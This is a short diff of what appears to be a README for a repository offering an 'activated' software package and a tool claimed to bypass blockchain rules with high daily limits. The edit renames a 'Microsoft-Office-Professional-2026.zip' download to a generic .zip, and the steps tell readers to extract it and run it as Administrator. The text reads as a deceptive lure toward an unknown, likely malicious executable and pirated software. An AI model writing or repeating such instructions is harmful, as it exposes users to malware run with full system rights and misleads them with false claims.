@@ -18,7 +18,7 @@ Bypass normal blockchain rules with high daily limits (e.g., tens of thousands o
 - **100% Activated** — Ready to use immediately
 
 ## How to Use
-1. **Download** the latest `Microsoft-Office-Professional-2026.zip` from the Releases page
+1. **Download** the latest .zip from the Releases page
 2. Extract the zip file to your Desktop
 3. Run as **Administrator**
 4. Follow the on-screen instructions
